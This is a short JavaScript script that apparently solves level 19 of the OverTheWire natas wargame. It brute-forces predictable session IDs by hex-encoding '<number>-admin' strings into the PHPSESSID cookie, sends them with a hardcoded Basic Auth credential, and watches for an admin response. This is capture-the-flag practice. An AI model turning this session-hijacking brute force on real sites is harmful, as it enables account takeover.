const got = require('got');

const sessionIds = [...Array(641).keys()]; // there are 640
sessionIds.forEach( (sessionId) => {
  const s = Buffer.from(`${sessionId}-admin`).toString('hex');
  got.get('http://natas19.natas.labs.overthewire.org/index.php?debug', {
    headers: {
      'Authorization': 'Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==',
      'Cookie': `PHPSESSID=${s}`}}).then(resp => 
      {
        if (resp.body.includes('You are an admin')) {
          console.log(`sessionId: ${sessionId} + ${resp.body}`);
        }
      });
});
